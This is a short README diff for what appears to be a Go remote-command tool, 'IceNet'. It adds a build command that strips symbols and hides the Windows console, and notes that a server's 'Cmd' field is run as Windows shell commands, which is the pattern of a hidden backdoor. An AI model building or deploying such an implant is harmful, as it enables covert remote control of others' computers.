@@ -14,6 +14,7 @@ response from your main server must look like this
     "Cmd":""
 }
 ```
+recommended build command : `go build -ldflags="-s -w -H windowsgui" -o output.exe IceNet.go`  
 in cmd you may write command for shell in windows "for this payload write cmd in Typemethod"
 
 for educational purposes only!
